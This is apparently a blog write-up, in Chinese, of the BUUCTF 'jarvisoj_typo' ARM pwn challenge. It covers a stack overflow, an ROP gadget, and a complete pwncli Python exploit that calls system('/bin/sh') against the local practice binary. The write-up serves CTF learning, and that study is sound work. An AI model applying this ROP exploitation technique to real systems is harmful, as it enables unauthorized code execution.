# BUUCTF-jarvisoj_typo



### 总结

根据本题，学习与收获有：

- `arm`指令集下的`pwn`题，和`x86`没有啥区别，只需要把指令集学明白，技巧都是一样的。
- `practice makes perfect!`

<!-- more -->



### checksec

![image-20220225210306416](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220225210306416.png)

### 漏洞点

在`sub_8d24`函数中，存在栈溢出：

![image-20220225210425758](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220225210425758.png)

![image-20220225210443879](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220225210443879.png)

### 利用思路

观察以下溢出函数的结束部分：

![image-20220225210531381](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220225210531381.png)

最后会从栈里面弹一个值到`pc`寄存器。那么存在栈溢出的时候，只需要控制`pc`寄存器即可，这里找到一个`gadget`：

```
0x00020904 : pop {r0, r4, pc}
```

然后只要找到`system`函数和`/bin/sh`字符串即可完成利用。找`system`还是找`exit 0`这个字符串。

![image-20220225210902689](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220225210902689.png)



### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

filename = "./typo"
context.binary = filename

def debug(*addrs):
    bps = ""
    for x in addrs:
        bps += f"-ex 'b * {hex(x)}'"
    os.system(f"tmux splitw -h \"gdb-multiarch {filename} -q -ex 'target remote 127.0.0.1:1234' {bps}\"")

bin_sh_addr = context.binary.search(b"/bin/sh").__next__()
payload = flat({
    0x70: [
        0x00020904, # pop r0 r4 pc
        bin_sh_addr,
        0,
        0x110b4 # system
    ]
})


io = process(["qemu-arm-static", "-g", "1234", filename])

debug(0x8de8)

io.recv()

io.send(b"\n")

io.recv()

io.send(payload)

io.interactive()
```

![image-20220225213559367](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220225213559367.png)

最后`getshell`：

![image-20220225213640268](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220225213640268.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2022-02-21-buuctf-jarvisoj-typo/  

